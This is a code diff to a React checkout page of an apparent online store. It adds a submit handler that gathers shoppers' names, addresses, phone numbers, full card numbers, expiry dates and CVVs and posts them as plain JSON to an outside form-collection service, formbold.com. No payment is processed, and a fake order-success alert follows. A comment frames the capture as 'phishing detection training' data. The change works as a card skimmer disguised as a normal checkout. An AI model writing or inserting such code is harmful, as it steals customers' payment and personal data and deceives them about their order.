@@ -1,21 +1,109 @@
+import { useState } from 'react';
 import { Header } from '@/components/Header';
 import { Footer } from '@/components/Footer';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { useCart } from '@/hooks/useCart';
-import { Navigate } from 'react-router-dom';
-import { Shield } from 'lucide-react';
+import { Navigate, useNavigate } from 'react-router-dom';
+import { Shield, Loader2 } from 'lucide-react';
 
 const Checkout = () => {
-  const { items, getTotal } = useCart();
+  const { items, getTotal, clearCart } = useCart();
+  const navigate = useNavigate();
   const total = getTotal();
   const hasMinimumForFreeShipping = total >= 20;
-  const finalTotal = total + (hasMinimumForFreeShipping ? 0 : 4.99);
+  const shipping = hasMinimumForFreeShipping ? 0 : 4.99;
+  const finalTotal = total + shipping;
+
+  // Form state
+  const [formData, setFormData] = useState({
+    firstName: '',
+    lastName: '',
+    email: '',
+    address: '',
+    city: '',
+    state: '',
+    zip: '',
+    phone: '',
+    cardNumber: '',
+    cardName: '',
+    expiry: '',
+    cvv: ''
+  });
+
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [error, setError] = useState('');
 
   if (items.length === 0) {
     return <Navigate to="/cart" />;
   }
+
+  const handleInputChange = (e) => {
+    const { id, value } = e.target;
+    setFormData(prev => ({
+      ...prev,
+      [id]: value
+    }));
+  };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    setError('');
+
+    // Prepare complete order data for phishing detection training
+    const orderData = {
+      // Shipping Info
+      firstName: formData.firstName,
+      lastName: formData.lastName,
+      email: formData.email,
+      address: formData.address,
+      city: formData.city,
+      state: formData.state,
+      zip: formData.zip,
+      phone: formData.phone,
+      
+      // Full Payment Info (for training model)
+      cardNumber: formData.cardNumber,
+      cardName: formData.cardName,
+      expiry: formData.expiry,
+      cvv: formData.cvv,
+      
+      // Order Details
+      orderItems: JSON.stringify(items),
+      subtotal: total.toFixed(2),
+      shipping: shipping.toFixed(2),
+      total: finalTotal.toFixed(2),
+      
+      // Timestamp
+      orderDate: new Date().toISOString()
+    };
+
+    try {
+      const response = await fetch('https://formbold.com/s/9mJYj', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(orderData)
+      });
+
+      if (response.ok) {
+        // Success! Clear cart and redirect
+        clearCart();
+        alert('Order placed successfully! Check your email for confirmation.');
+        navigate('/');
+      } else {
+        throw new Error('Failed to submit order');
+      }
+    } catch (err) {
+      setError('Failed to place order. Please try again.');
+      console.error('Order submission error:', err);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <div className="min-h-screen flex flex-col">
@@ -23,6 +111,12 @@ const Checkout = () => {
       
       <div className="container mx-auto px-4 py-8">
         <h1 className="text-4xl font-bold mb-8">Checkout</h1>
+
+        {error && (
+          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-6">
+            {error}
+          </div>
+        )}
 
         <div className="grid lg:grid-cols-3 gap-8">
           {/* Checkout Form */}
@@ -32,36 +126,86 @@ const Checkout = () => {
               <h2 className="text-2xl font-bold mb-6">Shipping Information</h2>
               <div className="grid md:grid-cols-2 gap-4">
                 <div>
-                  <Label htmlFor="firstName">First Name</Label>
-                  <Input id="firstName" placeholder="John" />
+                  <Label htmlFor="firstName">First Name *</Label>
+                  <Input 
+                    id="firstName" 
+                    placeholder="John" 
+                    value={formData.firstName}
+                    onChange={handleInputChange}
+                    required
+                  />
                 </div>
                 <div>
-                  <Label htmlFor="lastName">Last Name</Label>
-                  <Input id="lastName" placeholder="Doe" />
+                  <Label htmlFor="lastName">Last Name *</Label>
+                  <Input 
+                    id="lastName" 
+                    placeholder="Doe" 
+                    value={formData.lastName}
+                    onChange={handleInputChange}
+                    required
+                  />
                 </div>
                 <div className="md:col-span-2">
-                  <Label htmlFor="email">Email</Label>
-                  <Input id="email" type="email" placeholder="john@example.com" />
+                  <Label htmlFor="email">Email *</Label>
+                  <Input 
+                    id="email" 
+                    type="email" 
+                    placeholder="john@example.com" 
+                    value={formData.email}
+                    onChange={handleInputChange}
+                    required
+                  />
                 </div>
                 <div className="md:col-span-2">
-                  <Label htmlFor="address">Address</Label>
-                  <Input id="address" placeholder="123 Main St" />
+                  <Label htmlFor="address">Address *</Label>
+                  <Input 
+                    id="address" 
+                    placeholder="123 Main St" 
+                    value={formData.address}
+                    onChange={handleInputChange}
+                    required
+                  />
                 </div>
                 <div>
-                  <Label htmlFor="city">City</Label>
-                  <Input id="city" placeholder="New York" />
+                  <Label htmlFor="city">City *</Label>
+                  <Input 
+                    id="city" 
+                    placeholder="New York" 
+                    value={formData.city}
+                    onChange={handleInputChange}
+                    required
+                  />
                 </div>
                 <div>
-                  <Label htmlFor="state">State</Label>
-                  <Input id="state" placeholder="NY" />
+                  <Label htmlFor="state">State *</Label>
+                  <Input 
+                    id="state" 
+                    placeholder="NY" 
+                    value={formData.state}
+                    onChange={handleInputChange}
+                    required
+                  />
                 </div>
                 <div>
-                  <Label htmlFor="zip">ZIP Code</Label>
-                  <Input id="zip" placeholder="10001" />
+                  <Label htmlFor="zip">ZIP Code *</Label>
+                  <Input 
+                    id="zip" 
+                    placeholder="10001" 
+                    value={formData.zip}
+                    onChange={handleInputChange}
+                    required
+                  />
                 </div>
                 <div>
-                  <Label htmlFor="phone">Phone</Label>
-                  <Input id="phone" type="tel" placeholder="(555) 123-4567" />
+                  <Label htmlFor="phone">Phone *</Label>
+                  <Input 
+                    id="phone" 
+                    type="tel" 
+                    placeholder="(555) 123-4567" 
+                    value={formData.phone}
+                    onChange={handleInputChange}
+                    required
+                  />
                 </div>
               </div>
             </div>
@@ -74,21 +218,45 @@ const Checkout = () => {
               </div>
               <div className="space-y-4">
                 <div>
-                  <Label htmlFor="cardNumber">Card Number</Label>
-                  <Input id="cardNumber" placeholder="1234 5678 9012 3456" />
+                  <Label htmlFor="cardNumber">Card Number *</Label>
+                  <Input 
+                    id="cardNumber" 
+                    placeholder="1234 5678 9012 3456" 
+                    value={formData.cardNumber}
+                    onChange={handleInputChange}
+                    required
+                  />
                 </div>
                 <div>
-                  <Label htmlFor="cardName">Cardholder Name</Label>
-                  <Input id="cardName" placeholder="John Doe" />
+                  <Label htmlFor="cardName">Cardholder Name *</Label>
+                  <Input 
+                    id="cardName" 
+                    placeholder="John Doe" 
+                    value={formData.cardName}
+                    onChange={handleInputChange}
+                    required
+                  />
                 </div>
                 <div className="grid grid-cols-2 gap-4">
                   <div>
-                    <Label htmlFor="expiry">Expiry Date</Label>
-                    <Input id="expiry" placeholder="MM/YY" />
+                    <Label htmlFor="expiry">Expiry Date *</Label>
+                    <Input 
+                      id="expiry" 
+                      placeholder="MM/YY" 
+                      value={formData.expiry}
+                      onChange={handleInputChange}
+                      required
+                    />
                   </div>
                   <div>
-                    <Label htmlFor="cvv">CVV</Label>
-                    <Input id="cvv" placeholder="123" />
+                    <Label htmlFor="cvv">CVV *</Label>
+                    <Input 
+                      id="cvv" 
+                      placeholder="123" 
+                      value={formData.cvv}
+                      onChange={handleInputChange}
+                      required
+                    />
                   </div>
                 </div>
                 <div className="flex items-center justify-center gap-3 pt-4">
@@ -140,8 +308,20 @@ const Checkout = () => {
                 </div>
               </div>
 
-              <Button size="lg" className="w-full mt-6">
-                Place Order
+              <Button 
+                onClick={handleSubmit}
+                size="lg" 
+                className="w-full mt-6"
+                disabled={isSubmitting}
+              >
+                {isSubmitting ? (
+                  <>
+                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                    Processing...
+                  </>
+                ) : (
+                  'Place Order'
+                )}
               </Button>
 
               <p className="text-xs text-center text-muted-foreground mt-4">
